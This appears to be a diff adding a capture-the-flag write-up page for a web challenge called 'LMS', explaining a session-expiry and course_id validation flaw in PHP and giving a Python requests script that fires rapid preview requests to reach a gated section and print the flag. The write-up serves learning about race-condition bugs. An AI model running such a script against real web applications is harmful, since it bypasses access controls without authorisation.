@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOFLAKY - LMS Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0c0c0c;
+            color: #fff;
+            line-height: 1.6;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2rem;
+            background: #0c0c0c;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .logo {
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+
+        nav a:hover {
+            background-color: #7D5DE6;
+        }
+
+        .writeup-container {
+            max-width: 800px;
+            margin: 4rem auto;
+            padding: 0 1rem;
+        }
+
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .writeup-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .challenge-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+        }
+
+        .category {
+            background: #7D5DE6;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+        }
+
+        .diff {
+            color: #FFC600;
+            font-weight: bold;
+        }
+
+        .writeup-content {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 2rem;
+        }
+
+        .section {
+            margin-bottom: 2rem;
+        }
+
+        .section:last-child {
+            margin-bottom: 0;
+        }
+
+        .section h2 {
+            color: #7D5DE6;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .flag {
+            display: inline-block;
+            background: #2a2a2a;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 1.1rem;
+        }
+
+        /* VS Code-like styling for code blocks */
+        pre.code {
+            display: block;
+            background: #1E1E1E;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            margin: 1rem 0;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid #333;
+        }
+        
+        .code-bar {
+            display: flex;
+            justify-content: space-between;
+            background: #252526;
+            padding: 0.5rem 1rem;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+            border-bottom: 1px solid #333;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 0.8rem;
+        }
+        
+        .code-bar .file-name {
+            color: #CCCCCC;
+        }
+        
+        .code-bar .language {
+            color: #858585;
+        }
+        
+        .code-content {
+            padding: 1rem;
+        }
+        
+        /* Syntax highlighting */
+        .keyword {
+            color: #569CD6;
+        }
+        
+        .function {
+            color: #DCDCAA;
+        }
+        
+        .variable {
+            color: #9CDCFE;
+        }
+        
+        .string {
+            color: #CE9178;
+        }
+        
+        .comment {
+            color: #6A9955;
+        }
+        
+        .operator {
+            color: #D4D4D4;
+        }
+        
+        .bracket {
+            color: #D4D4D4;
+        }
+        
+        .parameter {
+            color: #9CDCFE;
+        }
+
+        .challenge-files {
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .challenge-files h2 {
+            color: #7D5DE6;
+            font-size: 1.5rem;
+        }
+
+        .challenge-files a {
+            color: #7D5DE6;
+            text-decoration: none;
+            padding: 5px;
+            background: #333;
+            border-radius: 5px;
+            transition: background 0.3s;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .challenge-files a:hover {
+            background: #5e3dbf;
+        }
+        
+        code.inline {
+            display: inline;
+            padding: 0.2rem 0.4rem;
+            background: #333;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .url {
+            word-break: break-all;
+        }
+
+        @media (max-width: 768px) {
+            .writeup-container {
+                margin: 2rem auto;
+            }
+            
+            .writeup-header h1 {
+                font-size: 2rem;
+            }
+            
+            .writeup-content {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="index.html" class="logo">SOFLAKY</a>
+        <nav>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="writeups.html">Writeups</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article class="writeup-container">
+            <header class="writeup-header">
+                <h1>LMS</h1>
+                <div class="challenge-meta">
+                    <span class="category">Web</span>
+                    <span class="diff">500</span>
+                </div>
+            </header>
+            <section class="writeup-content">
+                <div class="section">
+                    <h2>Description</h2>
+                    <p>"Who's the fastest man on Earth? = Whoooooooosh (sound effect)"</p>
+                    <p>This hinted that speed was a key factor in solving the challenge—likely requiring rapid execution of multiple requests before something expired.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Understanding the Vulnerability</h2>
+                    <p>By analyzing the provided PHP code, I noticed that in order to retrieve the flag, the following conditions had to be met:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">PHP Code</span>
+                            <span class="language">PHP</span>
+                        </div>
+                        <pre class="code"><span class="keyword">if</span> <span class="bracket">(</span><span class="function">isset</span><span class="bracket">(</span><span class="variable">$course</span><span class="bracket">[</span><span class="string">'flag'</span><span class="bracket">]</span><span class="bracket">)</span> <span class="operator">&&</span> <span class="function">isset</span><span class="bracket">(</span><span class="variable">$state</span><span class="bracket">[</span><span class="string">'progress'</span><span class="bracket">]</span><span class="bracket">[</span><span class="number">1</span><span class="bracket">]</span><span class="bracket">)</span> <span class="operator">&&</span> <span class="function">in_array</span><span class="bracket">(</span><span class="string">'intro'</span><span class="operator">,</span> <span class="variable">$state</span><span class="bracket">[</span><span class="string">'progress'</span><span class="bracket">]</span><span class="bracket">[</span><span class="number">1</span><span class="bracket">]</span><span class="bracket">)</span> <span class="operator">&&</span> <span class="function">isset</span><span class="bracket">(</span><span class="variable">$state</span><span class="bracket">[</span><span class="string">'progress'</span><span class="bracket">]</span><span class="bracket">[</span><span class="number">2</span><span class="bracket">]</span><span class="bracket">)</span> <span class="operator">&&</span> <span class="function">in_array</span><span class="bracket">(</span><span class="string">'intro'</span><span class="operator">,</span> <span class="variable">$state</span><span class="bracket">[</span><span class="string">'progress'</span><span class="bracket">]</span><span class="bracket">[</span><span class="number">2</span><span class="bracket">]</span><span class="bracket">)</span> <span class="operator">&&</span> <span class="variable">$section</span> <span class="operator">===</span> <span class="string">'advanced'</span><span class="bracket">)</span> <span class="bracket">{</span> 
+    <span class="function">echo</span> <span class="string">"Flag: {</span><span class="variable">$course</span><span class="bracket">[</span><span class="string">'flag'</span><span class="bracket">]</span><span class="string">}\n"</span><span class="bracket">;</span> 
+<span class="bracket">}</span></pre>
+                    </div>
+                    
+                    <p>This meant I needed to:</p>
+                    <ol style="margin-left: 2rem; margin-top: 1rem;">
+                        <li><strong>View Course 1's Introduction section</strong></li>
+                        <li><strong>View Course 2's Introduction section</strong></li>
+                        <li><strong>Access Course 2's Advanced section (which contains the flag)</strong></li>
+                    </ol>
+                    
+                    <p>Looking at how the session system worked:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">PHP Session Code</span>
+                            <span class="language">PHP</span>
+                        </div>
+                        <pre class="code"><span class="variable">$_SESSION</span><span class="bracket">[</span><span class="string">'preview_state'</span><span class="bracket">]</span> <span class="operator">=</span> <span class="bracket">[</span>
+    <span class="string">'course_id'</span> <span class="operator">=></span> <span class="variable">$courseId</span><span class="operator">,</span>
+    <span class="string">'section'</span> <span class="operator">=></span> <span class="variable">$section</span><span class="operator">,</span>
+    <span class="string">'started'</span> <span class="operator">=></span> <span class="function">time</span><span class="bracket">(</span><span class="bracket">)</span><span class="operator">,</span>
+    <span class="string">'expires'</span> <span class="operator">=></span> <span class="function">time</span><span class="bracket">(</span><span class="bracket">)</span> <span class="operator">+</span> <span class="bracket">(</span><span class="variable">$course</span><span class="bracket">[</span><span class="string">'preview_length'</span><span class="bracket">]</span> <span class="operator">></span> <span class="number">0</span> <span class="operator">?</span> <span class="variable">$course</span><span class="bracket">[</span><span class="string">'preview_length'</span><span class="bracket">]</span> <span class="operator">:</span> <span class="number">0</span><span class="bracket">)</span><span class="operator">,</span>
+<span class="bracket">]</span><span class="operator">;</span></pre>
+                    </div>
+                    
+                    <p>Each time I previewed a course, a session was created. However, the session expiration depended on the course's <code class="inline">preview_length</code>. <strong>Course 1 had 1 second, while Course 2 expired immediately</strong>.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Exploiting the Session Handling</h2>
+                    <p>The key discovery was that the session <strong>did not check course_id properly</strong>, meaning I could manipulate the requests programmatically to meet all conditions <strong>within a single second</strong> before the session expired.</p>
+                    
+                    <p>Since doing this manually was too slow, I automated it using Python with the <code class="inline">requests</code> library.</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">exploit.py</span>
+                            <span class="language">Python</span>
+                        </div>
+                        <pre class="code"><span class="keyword">import</span> <span class="variable">requests</span>
+<span class="keyword">from</span> <span class="variable">urllib.parse</span> <span class="keyword">import</span> <span class="variable">urljoin</span>
+
+<span class="variable">s</span> <span class="operator">=</span> <span class="variable">requests</span><span class="operator">.</span><span class="function">Session</span><span class="bracket">(</span><span class="bracket">)</span>
+<span class="variable">url</span> <span class="operator">=</span> <span class="string">"http://a8ea158080e3495fa4bd7.playat.flagyard.com/"</span>
+
+<span class="function">print</span><span class="bracket">(</span><span class="string">"Starting preview for course 1..."</span><span class="bracket">)</span>
+<span class="variable">s</span><span class="operator">.</span><span class="function">get</span><span class="bracket">(</span>
+    <span class="function">urljoin</span><span class="bracket">(</span><span class="variable">url</span><span class="operator">,</span> <span class="string">"index.php"</span><span class="bracket">)</span><span class="operator">,</span>
+    <span class="variable">params</span><span class="operator">=</span><span class="bracket">{</span>
+        <span class="string">"action"</span><span class="operator">:</span> <span class="string">"start_preview"</span><span class="operator">,</span>
+        <span class="string">"course_id"</span><span class="operator">:</span> <span class="string">"1"</span><span class="operator">,</span>
+        <span class="string">"section"</span><span class="operator">:</span> <span class="string">"intro"</span>
+    <span class="bracket">}</span>
+<span class="bracket">)</span>
+
+<span class="function">print</span><span class="bracket">(</span><span class="string">"View Course 1 Intro"</span><span class="bracket">)</span>
+<span class="variable">resp1</span> <span class="operator">=</span> <span class="variable">s</span><span class="operator">.</span><span class="function">get</span><span class="bracket">(</span>
+    <span class="function">urljoin</span><span class="bracket">(</span><span class="variable">url</span><span class="operator">,</span> <span class="string">"preview.php"</span><span class="bracket">)</span><span class="operator">,</span>
+    <span class="variable">params</span><span class="operator">=</span><span class="bracket">{</span><span class="string">"course_id"</span><span class="operator">:</span> <span class="string">"1"</span><span class="operator">,</span> <span class="string">"section"</span><span class="operator">:</span> <span class="string">"intro"</span><span class="bracket">}</span>
+<span class="bracket">)</span>
+
+<span class="keyword">if</span> <span class="variable">resp1</span><span class="operator">.</span><span class="variable">status_code</span> <span class="operator">!=</span> <span class="number">200</span><span class="operator">:</span>
+    <span class="function">print</span><span class="bracket">(</span><span class="string">f"WARNING: Got status code {</span><span class="variable">resp1</span><span class="operator">.</span><span class="variable">status_code</span><span class="string">} for course 1 intro"</span><span class="bracket">)</span>
+
+<span class="function">print</span><span class="bracket">(</span><span class="string">"View Course 2 Intro"</span><span class="bracket">)</span>
+<span class="variable">resp2</span> <span class="operator">=</span> <span class="variable">s</span><span class="operator">.</span><span class="function">get</span><span class="bracket">(</span>
+    <span class="function">urljoin</span><span class="bracket">(</span><span class="variable">url</span><span class="operator">,</span> <span class="string">"preview.php"</span><span class="bracket">)</span><span class="operator">,</span>
+    <span class="variable">params</span><span class="operator">=</span><span class="bracket">{</span><span class="string">"course_id"</span><span class="operator">:</span> <span class="string">"2"</span><span class="operator">,</span> <span class="string">"section"</span><span class="operator">:</span> <span class="string">"intro"</span><span class="bracket">}</span>
+<span class="bracket">)</span>
+
+<span class="function">print</span><span class="bracket">(</span><span class="string">"Access Advanced"</span><span class="bracket">)</span>
+<span class="variable">flag_resp</span> <span class="operator">=</span> <span class="variable">s</span><span class="operator">.</span><span class="function">get</span><span class="bracket">(</span>
+    <span class="function">urljoin</span><span class="bracket">(</span><span class="variable">url</span><span class="operator">,</span> <span class="string">"preview.php"</span><span class="bracket">)</span><span class="operator">,</span>
+    <span class="variable">params</span><span class="operator">=</span><span class="bracket">{</span><span class="string">"course_id"</span><span class="operator">:</span> <span class="string">"2"</span><span class="operator">,</span> <span class="string">"section"</span><span class="operator">:</span> <span class="string">"advanced"</span><span class="bracket">}</span>
+<span class="bracket">)</span>
+
+<span class="variable">content</span> <span class="operator">=</span> <span class="variable">flag_resp</span><span class="operator">.</span><span class="variable">text</span>
+<span class="function">print</span><span class="bracket">(</span><span class="variable">content</span><span class="bracket">)</span></pre>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Explanation of the Exploit</h2>
+                    <p>The exploit works through the following steps:</p>
+                    <ol style="margin-left: 2rem; margin-top: 1rem;">
+                        <li><strong>Start the preview for Course 1</strong> (activates session)</li>
+                        <li><strong>View Course 1's Intro</strong></li>
+                        <li><strong>View Course 2's Intro</strong> (bypassing restrictions by leveraging session behavior)</li>
+                        <li><strong>Access Course 2's Advanced section</strong>, where the flag is located</li>
+                    </ol>
+                    
+                    <p>Since all three requests were sent in quick succession using the script, the session was still valid when accessing the <strong>Advanced</strong> section, successfully retrieving the flag.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Key Takeaways</h2>
+                    <p>This challenge demonstrated classic race condition vulnerabilities in web applications:</p>
+                    <ul style="margin-left: 2rem; margin-top: 1rem;">
+                        <li>Improper session validation between different resources</li>
+                        <li>Lack of proper course_id verification between requests</li>
+                        <li>Time-based access controls that can be bypassed with automation</li>
+                    </ul>
+                    <p>The challenge name "LMS" (Learning Management System) and the hint about speed perfectly encapsulated the nature of the exploit—it was all about racing against the clock.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Flag</h2>
+                    <code class="flag">FlagY{************}</code>
+                </div>
+            </section>
+        </article>
+    </main>
+</body>
+</html>
